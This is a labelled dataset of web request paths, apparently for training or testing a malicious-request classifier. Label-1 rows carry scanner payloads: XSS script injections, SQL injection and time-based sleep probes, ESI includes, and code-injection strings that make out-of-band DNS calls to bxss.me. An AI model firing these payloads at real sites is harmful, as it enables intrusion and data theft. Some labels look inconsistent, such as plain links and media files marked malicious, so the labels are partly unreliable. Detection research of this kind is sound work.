request	label
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgdzt/202008/t20200818_2188773.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u592a\u9633\u5c71\u82ac\u82b3\u5546\u5e97	0
"/****/category/fengxianjingshi?*/-->'""""></iframe></script></style></title></textarea><script >alert(02055)</script>=1"	1
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/********/jcse/110105008056111/16/images/hanweb.css"	1
/****/jsly/znzgjdqzdhzbyjs/201610/t20161014_103590.html and 1>1	1
/***/003/003/282/00300328243_44e0a456.jpg	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u7ae3\u66e6\u5546\u884c	0
"/***/col40/index.html/<img src=""javascript:alert(922)"">"	1
/***/index.php?do=post&id=488&c=dt&a=goods&	1
/****/kycg/zscq/jsjzzq/css/style_20141111.css	0
"/******/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 7853=3291	1
/*****/system/2009/12/27/010034197.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u660e\u73cd\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/**********/joomla-resize.php	1
/****/zt/2020wznb/gznbzzqrmzfbm/202101/p020210128398341889105.pdf	0
/****/zzxxgk/jjhzj/xxgk_3623/zfxxgkml_3628/lzyj_3750/zcfg_3633/202002/t20200219_166658.html	0
/**********/system/2021/10/04/013460358.shtml	0
/**********/system/2021/08/31/ data:image/svg xml,<svg viewbox=	1
/zwxx_11337/****/201707/t20170727_301014.html	0
/****/tzgg/tz16/201612/images/jianfan.js	0
/******/qhkc/?--></script><script>alert(42)</script>	1
/*****/gy48/cpgyss.asp?key=\u69a8\u6cb9\u673a\u4ef7\ufffd?&l=\ufffd\u3f6d	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9884\u65fa\u9547\u5e73\u4ef7\u5546\u5e97	0
/****/20201224/e112998165.html	0
/****/js/commons/base.js?v=11&time=1639980236398	0
/***/0/10/81/97/10819798_508802.jpg	0
/****/web/search?page=2%') or 0806=6049 /*&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/system/2017/05/02/012300190.shtml	0
/****/gjys/ and 1=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6cfe\u9f99\u6587\u8c6a\u517b\u6b96\u573a	0
/******/nxrq_hd_lytj_icon_blue.png	0
/***/0/02/08/59/2085913_660414.jpg	0
/***/col37/index.html	0
"/******/resource/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/newcalendar/my97datepicker.htm"	1
/******/sfdc/index.shtml	1
/****/web/search?channelid=222832&searchword=\u4e2d\u963f\u6dd8\u8d2d(\u5b81\u590f)\u7535\u5b50\u5546\u52a1\u6709\u9650\u516c\u53f8\u9752\u94dc\u5ce1\u9547\u5206\u516c\u53f8	0
/*******/201912/201912110806461000.html	0
/******/download/downfile.jsp?classid=0' and 3839=3839 and 'tpzi'='tpzi&filename=7b396d3a62ad4679b73346f1765342f3.xls	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5e7f\u901a\u529e\u516c\u8bbe\u5907\u7ecf\u9500\u90e8	0
/******/system/2021/03/04/013345080.shtml	0
/**********/system/more/221000000000000/0010/221000000000000_00001083.shtml	0
/****/bmkx/ssjj/index_3.html	0
/****/goform/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u957f\u5c71\u5934\u519c\u573a\u9f0e\u76db\u6279\u53d1\u5546\u884c	0
/***/resource/js/***/font-size.js	0
/***/system/2009/02/18/002690115.shtml	0
/************/account-opening-process' and 2*3*8=6*8 and '2xuq'='2xuq/2017-01-13/138.html	1
/****/system/2021/12/08/javascript:dozoom(9)	1
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(907)</script>?_=1630311639680"	1
/******/xxwzqh/img3/6.jpg	0
/****/system/2013/07/23/javascript:dozoom(9)	1
/******/usercenter/index?qrcode=quicklyrq,2,0,10007011&code=031qxrll2xp1l842ydll2swaqy3qxrlj	0
"/****/¡´ª®…Ω?page=1'""""()&%<acx><script >vnoi(9088)</script>"	1
"/****/zfwjn/1088/1103/list.html?new=' 'a'.concat(70-3).concat(22*4).concat(121).concat(88).concat(104).concat(76) (require'socket'
socket.gethostbyname('hitkx' 'yadculngb7003.bxss.me.')[3].to_s) '"	1
/**********/system/2020/04/10/013136686.shtml	0
/**********/system/2021/08/12/013433966.shtml	0
/**********/system/2021/08/22/013438310.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=28	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u7389\u7fe1\u51c9\u76ae\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u864e\u76fc\u6728\u95e8\u7ecf\u9500\u90e8	0
/***/mobile_h5/waparticledetail.do?article_id=201909250859001011&contenttype=article	1
/*****/gy48/cpgyss.asp?key=\u94f8\u94c1\u522e\u7814\u5e73\u677f&l=\ufffd\ufffd\ufffd	0
/****/lzqh/qydt/202112/t20211201_322613.html	0
/****/gjdjbn/djbn_gjjs/202109/t20210926_317284.html	0
"/************/categorysearch.do?cateid=1&eq=1'""""()&%<acx><script >zsez(9531)</script>&oq=1&p=1&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/**********/2021-12-16.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl%' or 2916=2916 /*&owner=1707212448&wbfileid=51419	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u8611\u8611\u5176\u6735\u7206\u7c73\u82b1\u5e97	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5c0f\u4e09\u9ebb\u8fa3\u70eb\u5e97\u90b5\u6865\u8def\u5206\u5e97	0
/****/xqldly/hfhnsj/202110/t20211017_195390.html	0
/****/zt/hjbhdc/201911/t20191129_1866701.html	0
/***/minip/yimiao/back.png	0
/*****/system/2011/04/01/010326559.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u738b\u519b\u9972\u6599\u7ecf\u8425\u90e8	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4e0a\u5e02	0
"/****/bysrd/201611/t20161129_78961.html?leader=¬Ì«⁄<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e50\u8299\u86cb\u7cd5\u623f	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10') or 6395=6395	1
"/****/zzxxgk/' 'a'.concat(70-3).concat(22*4).concat(119).concat(65).concat(109).concat(87) (require'socket'
socket.gethostbyname('hitga' 'hrrbztiz2c35a.bxss.me.')[3].to_s) '/zfxxgkml_2127/hygq_2064/list.html"	1
/***/003/004/498/00300449838_f07e711b.jpg	0
"/****/mtgz/2021_0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/202103/t20210314_271326.html"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19103656582948199607_1639972984534	0
/****/gggs/202110/t20211009_195170.html	0
/***/003/004/416/00300441637_46b0c4c8.jpg	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4977)"">?_=1630312229525"	1
/******/usercenter/index?qrcode=6571	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f6d\u5821\u9547\u6e05\u9999\u658b\u9910\u5385	0
/******/index.php/?s=captcha	1
"/************/categorysearch.do?cateid=1&p=1&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/***/003/001/528/00300152851_56402de5.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u660e\u73e0\u7b5b\u7f51\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6da6\u4e1c\u4fe1\u606f\u54a8\u8be2\u90e8	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u6597\u8fdb\u91d1\u4e94\u91d1\u7ecf\u9500\u90e8	0
/***/interface/url_total_pv.json.jsp?callback=jquery191007480028083756851_1639991069392	0
/****/zxxx/content.html?metadataid=10063129	0
/****/zt/hjbhdc/201708/t20170807_375260.html	0
/**********/system/2020/06/13/013184525.shtml	0
/****/ssxklzzjsx/xczb/index.shtml	0
"/******/system/2021/06/09'""/>/</script/>/<svg/onload=alert(2374) width=100//>/013399706.shtml"	1
"/****/czgk/bmyjs/zzqfyxt/znxrmfy/202102/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/system/2017/03/09/javascript:dozoom(12)	1
/**********/system/2020/06/16/013186667.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u8001\u5b8b\u6309\u6469\u517b\u751f\u9986	0
/****/system/2013/02/21/javascript:dozoom(14)	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5927\u575d\u79cd\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/***/getlist?vno=3.5.0°¡tamp=1639973089366&	0
/****/bmkx/sajj/201901/t20190108_113252.html	0
/****/201909/t20190926_1756825.html	0
/****/0628/191604.shtml	0
"/****/index.php?show_record_links=1&table=products"""">alert(777);&add_new_item=1"	1
/****/js/chunk-5a1a010d.6a8a6a57.js	0
/*****/fzrw	0
/***/003/003/939/00300393938_c6faaa1f.jpg	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%' or 7529=4625 and '%%'='%&outlinepage=10	1
/**********/system/2021/01/07/013316112.shtml	0
/****/tips/tipsloginsubmit.action	1
/****/zfwjn/1079/1081/bxss.me/t/xss.html?	1
/****/zjdt/zjdt/gzdt/33.htm	1
/*/210909-2/bxss.me/t/xss.html?	1
/****/bmkx/sfgw/201610/t20161025_14223.html	0
"/****/category/gaocengdongtai?page=1*/-->'""""></iframe></script></style></title></textarea><script >alert(39154)</script>"	1
/****/zfwjn/1088/1097/list.html?new='.gethostbyname(lc('hitgn'.'pxochgwg63553.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(110).chr(87).chr(106).chr(80).'	1
/**********/system/2020/09/17/013248915.shtml	0
/**********/system/2020/09/02/013238664.shtml	0
/****/css/chunk-vendors.b1f6b906.css	0
/***/0/02/06/00/2060034_830465.jpg	0
/***/0/02/10/48/2104821_501050.jpg	0
/*****/index_bszn_tzz.html	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/****/csjs/zcwj/1.htm"	1
/zwxx_11337/****/zcjd/201905/*	0
/**********/system/2021/10/07/javascript:window.close();	1
/******/system/2020/02/14/013082984.shtml	0
/zwxx_11337/****/202106/*	0
/*/if(now()=sysdate(),sleep(12),0)/viewclick/	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u6c38\u5f3a\u7535\u710a\u4fee\u7406\u90e8	0
/****/xxgkml/rsrm/201901/t20190102_113067.html	0
/**********/system/2021/12/08/javascript:void();	1
/***********/shangpinqihuo/heisebankuai/2021-04-01/javascript:void(0)	1
/*******/qiye/b-e2286161.html	0
/******/public/2021/11/04/20211104_17ce878ad56_r1_1200k.mp4	0
/******/system/2020/09/13/javascript:void(0);	1
/***/0/01/91/00/1910071_054595.gif	0
/zwxx_11337/****/201912/t20191226_1905171.html	0
"/************/template/jcse/110105008056111/16/'""""()&%<acx><script >5il4(9490)</script>/catesearchbtn.js"	1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%' or 4634=4634	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u82cf\u5e05\u519b\u74dc\u679c\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/201909/t20190926_1757197.html	0
/****/tzgg/202112/t20211204_3195779_zzb.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u548c\u987a\u5546\u5e97	0
/****/bmkx/jtysj/202007/w020200715644968621475.jpg	0
/****/xqldly/hfjysj/201911	0
"/****/gfxwj/202008/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u5c71\u95e8\u6751\u79fb\u6c11\u533a\u65e5\u7528\u767e\u8d27\u8d85\u5e02	0
"/***/2021/8/18/art_46_237432.html/<img src=""javascript:alert(6757)"">"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u767e\u59d3\u4e50\u74dc\u679c\u852c\u83dc\u95e8\u5e02\u90e8	0
/**********/system/2021/07/29/013427583.shtml	0
/***/0/01/92/05/1920545_124208.png	0
/gywm_10175/****/xwzx/rwfc/ywly/kjyf/qywh/kjcx/xxgk/zycwxx/gjjtwzq/images/jquery-1.7.1.min.js	0
"/******/rss/rssfeed.jsp/""><script>alert(5738)</script>?colid=35"	1
/*****/gy42/cpgyss.asp?key=\ufffd\u01b6\ufffd\u04ba&l2=\ufffd\u0435\ufffd&l=\ufffd\u04f1\ufffd	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u013e\ufffd\ufffd\u0479\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u94f6\u9886\u9970\u5c1a\u9970\u54c1\u5e97	0
/******/usercenter/index?qrcode=38459&code=0718ptfa17r4kc0yczha1zomlj08ptfl	0
/*****/gy48/ljcpgyview.asp?id=40507937&l=\ufffd\u03fa\ufffd	0
"/***/col136/index.html/""><script>alert(440)</script>"	1
"/***********/meizhoujiangtang/0""""xor(if(now()=sysdate(),sleep(14),0))xor""""z_6.html"	1
"/***/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/****/20180412/4802.html	0
/**********/system/2021/11/06/javascript:window.close();	1
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12007,""place_id"":""fm_sp_ard"",""news_id"":""1250538""}"	0
/****/images/socialsecurityapply.png	0
/****/czgk/czjs/201710/t20171031_547798.html	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/tb/	0
/**********/system/2020/03/11/013110843.shtml	0
/zwxx_11337/****/201707/t20170727_301831.html	0
/***************/cpsms/20210428/9759.html	0
"/****/web/search?channelid=234439&orderby=relevance&*/-->'""""></iframe></script></style></title></textarea><script >alert(78202)</script>=24&searchword=1"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u8dc3\u52a8\u978b\u5e97	0
/****/20211214/10888.html	0
/**********/system/2020/05/27/013171695.shtml	0
/******/system/2020/10/16/javascript:void(0);	1
/****/xxgkml/qtfdxx/zdjcyjzj/202106/url	0
/**/system/2021/07/06/012177620.shtml	0
/zwxx_11337/****/ytdd/201812/t20181212_1207416.html	0
"/****/xxgknb/2013/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(106).concat(77).concat(119).concat(65) (require""""socket""""
socket.gethostbyname(""""hitfp"""" """"adqcbwqe2d91d.bxss.me."""")[3].to_s) """""	1
/****/gjdjbn/djbn_gjjs/202109/	0
"/****/czgk/bmyjs/rmtt/tw/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9876\u65fa\u6e90\u7389\u77f3\u540d\u54c1\u5e97	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u674e\u6df3\u5efa\u6750\u5546\u5e97	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u674e\u6d0b\u517b\u6b96\u573a	0
/****/system/2016/11/15/012185230.shtml	0
"/**/ui/' 'a'.concat(70-3).concat(22*4).concat(122).concat(71).concat(109).concat(87) (require'socket'
socket.gethostbyname('hitul' 'trbyppcx5d550.bxss.me.')[3].to_s) '/security/sm2.js"	1
/******/global.css	0
/***/0/01/75/47/1754733_906840.jpg	0
/****/web/search?page=2&channelid=222832&searchword=\u5355\u4f4d&keyword=\u5355\u4f4d&perpage=20&outlinepage=10	0
/zwxx_11337/****/202106/t20210602_2869567.html	0
/****/zdlygk'||'/bzxajgc/szss/plx.htm	1
/****/web/search?channelid=220579.)()'(',.(&orderby=-docreltime&perpage=15&searchword=1&prekeyword=1&iptsword2=\u8f93\u5165\u5173\u952e\u5b57	0
/**/system/count/0003001/000000000000/count_page_list_0003001000000000000.js	0
"/*******/status_captiveportal.php?zone='""><script>alert(777);</script>"	1
/*******/zwgk/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqblj/	0
/****/web/search?channelid=299868) and 5022=0972#&perpage=1000	1
/******/20140620.jpg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery1910770647737158606_1639991153820	0
/****/web/search?searchword=1&channelid=287219&perpage=24' or 6995=8749 and '1'='1&templet=1&token=1	1
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/******/fdzdgknr/qtfdxx/qzqd/"	1
/****/xh/hy/201902/t20190202_1273987.html	0
/zwxx_11337/****/202003/t20200318_1994591.html	0
/**********/system/2020/11/26/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8fdb\u6dd1\u5e8a\u54c1\u5e97	0
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777)	1
/****/lkw	0
/investors-garden/**********/graphic/if(now()=sysdate(),sleep(32),0)-02-27/8981.html	1
/****/qyjbxx/gjglry/javascript:stranbody();	1
/***/interface/comul_total.json.jsp?callback=jquery111107011336445903558_1639980279457	0
/****/1114/538620.shtml	0
/**/index.php?title=acunetixtestb985b4&action=submit	1
/**********/system/2020/04/23/013146706.shtml	0
/*******/qiye/b-e2274201.html	0
/*******/3zfy.php	1
/zwxx_11337/****/201707/t20170727_302449.html	0
/*****/system/2021/06/25/javascript:window.print()	1
"/**/wh.html/<img src=""javascript:alert(827)"">"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6f6e\u6211\u770b\u978b\u5e97	0
/****/bmkx/sczj/202102/t20210226_177934.html	0
/*******/qiye/b-e2396243.html	0
/**********/system/2021/01/31/013329569.shtml	0
/*****/gy48/cpgyss.asp?key=\u9ad8\u538b\u6cb9\u7ba1&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/********/show.do	1
/************/static/contract/alloyfinger.js?6.0.8.398	0
/****/zt/msss/msxw/201912/t20191217_1891933.html	0
/*******/qiye/b-e1484143.html	0
/**/system/2021/10/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/?loginid=00150449&stamp=1640016448165&token=622af39bb32cc944e68f19403957674b36b82001&hrn=00150449	0
/****/winge.php	1
/**/ourbusiness/finance/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/bmkx/jkzx/201805/t20180525_103807.html	0
/***/javascript:void(0);	1
"/**/aboutus/"" and ""x""=""y"	1
/****/?icl_action=reminder_popup&target=javascript:alert(777);//	1
/**********/system/2021/07/05/013413546.shtml	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u516c\u4e3b\u670d\u9970\u5e97	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5357\u73af\u8def\u6fb3\u4f26\u978b\u5e97	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u5b97\u5143\u5e73\u4ef7\u725b\u7f8a\u8089\u5e97	0
/**/system/2020/12/02/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d69\u5b87\u5efa\u7b51\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(656)"">?_=1630311541009"	1
/****/system/2017/10/20/012446166.shtml	0
/**********/system/2016/12/28/012214685.shtml	0
/****/tzgg/202006/t20200612_2136098.html	0
"/*****/dashboard/index/41730?did=4&period=3"""">alert(/777/)"	1
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5174\u76db\u7164\u70ad\u914d\u9001\u670d\u52a1\u6709\u9650\u516c\u53f8	0
/****/web/search?searchword=1' or 9646=9646 /*&channelid=287219&perpage=24&templet=1&token=1	1
"/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/'""""()&%<acx><script >8m5j(9862)</script>.html"	1
/****/qyjbxx/' and 'x'='x	1
/******/system/2021/03/06/013346349.shtml	0
/****/xqldly/hfbysj/201909/t20190902_141748.html	0
/****/sj1/jjzs/202108/encodeuricomponent(window.location.href)	1
/****/system/2019/12/26/013044609.shtml	0
/****/20201210/e111843471.html	0
/****/xxgkml/hygq_3720/rdhy/202108/t20210823_185992.html	0
/****/czgk/bmyjs/qtdw/zzqtycpglzx/201903/t20190305_1297668.html	0
/*****/system/2019/06/06/javascript:window.print()	1
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1256911&version=3.6.0	0
/******/system/2016/12/08/012201650.shtml	0
/**********/system/2020/05/07/013156260.shtml	0
/*****/0/02/03/81/2038120_696429.mp4	1
/*******/202103/202103240946281027.html	0
/**********/system/2021/12/17/013496155.shtml	0
/****/bmkx/skjj/201610/t20161025_12198_wap.html	0
/zwxx_11337/****/202112/t20211201_3175765.html/index_1.html	0
/****/jzgj/	0
/**********/system/2020/04/24/013148031.shtml	0
/****/wdsjs/hfswsj/201903/t20190319_115321_wap.html	0
/****/system/2021/06/01/javascript:window.print()	1
/****/vd6q3s-article-e118704599.html	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm	1
/**********/system/2020/05/25/013169654.shtml	0
/******/usercenter/index?qrcode=10333	0
/****/bwcx/dtbb/jtdt/201911/t20191122_238495.html	0
/**/i5_a.jpg	0
"/****/"""".gethostbyname(lc(""""hituc"""".""""zttokjzi6bc23.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(122).chr(87).chr(98).chr(89).""""/ybjsqzn/list.html"	1
/***/wxlzsl/202103/t20210303_2614126.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202101/t20210126_176815.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u831c\u96ef\u5316\u5986\u54c1\u5e97	0
/****/zzxxgk/	0
/***/003/004/231/00300423153_3f268584.jpg	0
/****/jjdytpgjz/202111/t20211126_196990.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u661f\u6708\u697c\u9910\u5385	0
/****/web/search?channelid=222832&searchword=\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u9633\u5149\u4fbf\u5229\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5b9d\u8d1d\u767e\u5206\u767e\u5b55\u5a74\u7ae5\u767e\u8d27\u6021\u661f\u513f\u7ae5\u57ce\u5e97	0
/*/210909-bxss.me/t/xss.html?	1
/**/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/bmkx/sgsj/201811/t20181127_112099.html	0
/*******/qiye/b-e2155577.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\u04ba\u0479\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
"/news'""""()&%<acx><script >paqt(9617)</script>/**************/:alias"	1
"/***/2021/10/'""""()&%<acx><script >iowy(9012)</script>/art_34_242318.html"	1
/*****/system/2017/09/26/012426971.shtml	0
/**********/system/2020/06/06/013179312.shtml	0
/****/czgk/bmjs/zzqgyqy/zzqmtdzj/	0
/***/0/11/40/99/11409961_346790.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u7ee7\u83b2\u65e5\u7528\u54c1\u7ecf\u9500\u90e8	0
/**********/system/2021/11/04/013475028.shtml	0
/****/ and 1=1	1
/****/web/search?&channelid=254846&searchword=\u8f6e\u673a\u5458&keyword=\u8f6e\u673a\u5458	0
/*******/qiye/b-e364601.html	0
/***/mobile_h5/waparticledetail.do?article_id=201909160856481011&contenttype=article	0
/zwxx_11337/****/202004/t20200413_2019596.html	0
/**********/system/2021/08/20/013437697.shtml	0
/zwxx_11337/****/ytdd/202005/t20200507_2057767.html	0
/******/jquery.superslide.js	1
/*******/qiye/businesses-e42579_5.html?category_id=242124	0
/****/zzxxgk/wsjkwyh/xxgk_3565/zfxxgkml_3570/zcjd_3583/202109/t20210914_186621.html	0
/**********/system/2020/05/21/013167134.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19104302516417480171_1639990836653	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u65b9\u821f\u5e7f\u544a\u90e8	0
/*/index.jsp	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9a6c\u5c11\u864e\u9992\u5934\u5e97	0
/system%' and 2*3*8=6*8 and 'gebf'!='gebf%/********/js/newcalendar/my97datepicker.htm	1
/*****/xdny/201910/t20191028_143596.html	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202012/w020201222361747848857.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5218\u9e4f\u4fee\u7406\u90e8	0
"/' 'a'.concat(70-3).concat(22*4).concat(120).concat(77).concat(111).concat(70) (require'socket'
socket.gethostbyname('hitee' 'xnmildny059d3.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/ui.css"	1
/*****/gy42/ljcpgyview.asp?id=29359496&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3dab	0
"/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='""><script>alert(77729;</script>"	1
"/****/web/search?page=2&channelid=253477&searchword=1 and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/****/system/2021/11/18/javascript:dozoom(9)	1
/****/system/2021/11/03/javascript:dozoom(14)	1
/*******/202003/202003310917491022.html	0
/****/zdgz/2020_zdgz/202105/t20210531_279635.html	0
/****/bmkx/http://bxss.me/t/fit.txt?.jpg/	1
